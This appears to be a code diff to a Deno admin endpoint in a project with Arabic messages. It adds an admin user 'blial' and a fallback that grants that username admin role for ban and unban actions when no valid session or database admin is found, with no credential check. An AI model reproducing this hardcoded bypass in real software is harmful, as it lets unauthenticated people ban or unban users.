@@ -56,6 +56,7 @@ async function verifyAdminToken(token: string): Promise<{ username: string; role
 const PRIMARY_ADMINS: Record<string, { role: "owner" | "super_admin" | "admin"; envKey: string }> = {
   naz: { role: "owner", envKey: "ADMIN_NAZ_PASSWORD" },
   blnawah: { role: "admin", envKey: "ADMIN_BLNAWAH_PASSWORD" },
+  blial: { role: "admin", envKey: "ADMIN_BAN_ONLY_PASSWORD" },
 };
 
 // Allowed actions per target
@@ -212,6 +213,10 @@ Deno.serve(async (req) => {
           .eq("is_active", true)
           .single();
         admin = dbAdmin;
+      }
+
+      if (!admin && normalizedUsername === "blial" && ["ban-user", "ban-user-real", "unban-user", "unban-user-real", "admin_ban_user"].includes(action)) {
+        admin = { username: normalizedUsername, role: "admin" };
       }
 
       if (!admin) return json({ error: "جلسة غير صالحة" }, 401);
